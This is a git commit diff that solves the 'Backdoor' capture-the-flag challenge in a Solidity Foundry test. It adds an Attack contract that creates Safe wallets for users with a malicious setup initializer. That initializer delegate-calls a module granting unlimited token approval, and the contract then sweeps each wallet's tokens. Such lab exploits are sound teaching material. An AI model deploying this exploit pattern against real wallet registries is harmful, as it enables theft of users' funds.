62d5a7410538b63b0b7b77c17e745b4333f96b48
alex <hmpippo@gmail.com>
2026-09-07 09:22:18 +0800

    backdoor

--- test/backdoor/Backdoor.t.sol
+++ test/backdoor/Backdoor.t.sol
@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {Safe, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
@@ -70,7 +70,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new Attack(users, recovery, token, singletonCopy, walletFactory, walletRegistry);
     }
 
     /**
@@ -92,5 +92,54 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attack {
+    address[] public users;
+    address public immutable recovery;
+    DamnValuableToken public immutable token;
+    Safe public immutable singletonCopy;
+    SafeProxyFactory public immutable walletFactory;
+    WalletRegistry public immutable walletRegistry;
+    Dummy dummy;
+
+    constructor(
+        address[] memory _users,
+        address _recovery,
+        DamnValuableToken _token,
+        Safe _singletonCopy,
+        SafeProxyFactory _walletFactory,
+        WalletRegistry _walletRegistry
+    ) {
+        users = _users;
+        recovery = _recovery;
+        token = _token;
+        singletonCopy = _singletonCopy;
+        walletFactory = _walletFactory;
+        walletRegistry = _walletRegistry;
+        dummy = new Dummy();
+        attack();
+    }
+
+    function attack() public {
+        address[] memory _users = users;
+        for (uint256 i = 0; i < _users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            bytes memory payload = abi.encodeCall(Dummy.approve, (token, address(this)));
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup, (owners, 1, address(dummy), payload, address(0), address(token), 0, payable(recovery))
+            );
+            address payable wallet =
+                payable(walletFactory.createProxyWithCallback(address(singletonCopy), initializer, 0, walletRegistry));
+            token.transferFrom(wallet, recovery, 10e18);
+        }
+    }
+}
+
+contract Dummy {
+    function approve(DamnValuableToken token, address spender) external {
+        token.approve(spender, type(uint256).max);
     }
 }
